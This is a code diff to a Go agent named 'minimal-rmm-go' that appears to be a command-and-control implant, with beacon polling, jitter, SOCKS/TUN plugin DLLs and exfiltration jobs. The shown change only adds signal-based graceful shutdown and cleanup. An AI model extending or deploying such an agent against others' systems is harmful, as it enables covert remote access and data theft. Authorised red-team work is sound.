@@ -18,12 +18,14 @@ import (
 	"net/url"
 	"os"
 	"os/exec"
+	"os/signal"
 	"path/filepath"
 	"regexp"
 	"runtime"
 	"strconv"
 	"strings"
 	"sync"
+	"syscall"
 	"time"
 )
 
@@ -68,6 +70,7 @@ var (
 	defaultJitterPercentB64 string
 	logMu                   sync.Mutex
 	logFile                 *os.File
+	agentContext            = context.Background()
 )
 
 var pluginCommandPattern = regexp.MustCompile(`^[A-Za-z][A-Za-z0-9._-]{0,127}$`)
@@ -85,22 +88,32 @@ func main() {
 		}
 		return
 	}
+	ctx, stopSignals := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
+	defer stopSignals()
+	agentContext = ctx
 	initAgentLog()
+	defer closeAgentLog()
 	cfg, err := loadConfig()
 	if err != nil {
 		logf("configuration error: %v", err)
+		closeAgentLog()
 		os.Exit(2)
 	}
 	logf("starting agent for %s", cfg.BaseURL)
 	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
 	client := newHTTPClient(cfg)
+	defer client.CloseIdleConnections()
 	socksPlugin := newPluginController("/tools/plugins/socks.dll")
 	tunPlugin := newPluginController("/tools/plugins/tun.dll")
 	defer socksPlugin.stop()
 	defer tunPlugin.stop()
+	defer stopPlatformWorkers()
 
-	for {
+	for ctx.Err() == nil {
 		if err := register(client, cfg); err != nil {
+			if ctx.Err() != nil {
+				return
+			}
 			if isSessionTerminatedError(err) {
 				logf("session terminated by server")
 				return
@@ -110,6 +123,9 @@ func main() {
 			continue
 		}
 		if err := pollOnce(client, cfg, socksPlugin, tunPlugin); err != nil {
+			if ctx.Err() != nil {
+				return
+			}
 			if err.Error() == "session terminated by server" {
 				return
 			}
@@ -144,7 +160,7 @@ func (p *pluginController) syncActive(active bool, client *http.Client, cfg *con
 			p.mu.Unlock()
 			return
 		}
-		ctx, cancel := context.WithCancel(context.Background())
+		ctx, cancel := context.WithCancel(agentContext)
 		done := make(chan struct{})
 		p.running = true
 		p.cancel = cancel
@@ -735,7 +751,7 @@ func cloudUploadResultWithLink(job exfilJob, success bool, size int64, failure, 
 }
 
 func request(client *http.Client, cfg *config, method, endpoint string, query url.Values, body []byte) ([]byte, error) {
-	return requestContext(context.Background(), client, cfg, method, endpoint, query, body)
+	return requestContext(agentContext, client, cfg, method, endpoint, query, body)
 }
 
 // requestContext performs one authenticated beacon request and lets a
@@ -835,7 +851,22 @@ func sleepWithJitter(cfg *config, rng *rand.Rand) {
 			delay = 1
 		}
 	}
-	time.Sleep(time.Duration(delay) * time.Second)
+	timer := time.NewTimer(time.Duration(delay) * time.Second)
+	defer timer.Stop()
+	select {
+	case <-timer.C:
+	case <-agentContext.Done():
+	}
+}
+
+// closeAgentLog serializes final file closure with any remaining log writer.
+func closeAgentLog() {
+	logMu.Lock()
+	defer logMu.Unlock()
+	if logFile != nil {
+		_ = logFile.Close()
+		logFile = nil
+	}
 }
 func logf(format string, args ...any) {
 	line := fmt.Sprintf("[minimal-rmm-go] "+format+"\n", args...)
